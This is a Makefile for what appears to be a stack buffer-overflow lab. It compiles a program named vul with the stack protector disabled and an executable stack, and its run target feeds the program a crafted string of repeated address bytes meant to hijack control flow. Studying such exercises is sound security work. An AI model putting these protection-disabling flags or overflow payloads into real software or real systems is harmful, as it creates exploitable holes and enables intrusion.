build:
	gcc -fno-stack-protector -fomit-frame-pointer -z execstack -o vul vul.c

run:
	./vul `echo -n -e "\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06"`

clean:
	rm vul
